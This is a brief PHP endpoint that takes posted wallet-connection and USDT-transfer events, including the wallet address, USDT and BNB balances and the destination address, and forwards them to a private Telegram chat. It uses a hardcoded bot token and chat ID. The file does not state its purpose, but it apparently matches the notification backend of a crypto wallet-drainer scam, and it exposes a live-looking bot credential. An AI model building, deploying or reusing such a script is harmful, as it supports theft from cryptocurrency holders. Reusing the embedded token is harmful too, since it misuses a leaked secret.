<?php
date_default_timezone_set('Asia/Kolkata');

// Telegram config
$botToken = "7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM";
$chatId = "8191508290";

// Get POST data
$data = json_decode(file_get_contents("php://input"), true);

$type = $data["type"]; // "connect" or "tx"
$wallet = $data["wallet"] ?? "N/A";
$usdt = $data["usdt"] ?? "0";
$bnb = $data["bnb"] ?? "0";
$to = $data["to"] ?? "";
$time = date("d-m-Y h:i:s A");

// Format message
if ($type === "connect") {
    $msg = "🟢 *Wallet Connected*\n\n👛 *Wallet:* `$wallet`\n💵 *USDT:* $usdt\n🪙 *BNB:* $bnb\n🕒 *Time:* $time";
} elseif ($type === "tx") {
    $msg = "✅ *USDT Transfer*\n\n👛 *From:* `$wallet`\n➡️ *To:* `$to`\n💵 *Amount:* $usdt USDT\n🕒 *Time:* $time";
} else {
    http_response_code(400);
    echo "Invalid type";
    exit;
}

// Send message to Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$params = [
    "chat_id" => $chatId,
    "text" => $msg,
    "parse_mode" => "Markdown"
];

file_get_contents($url . "?" . http_build_query($params));

http_response_code(200);
echo "Notification sent";
?>
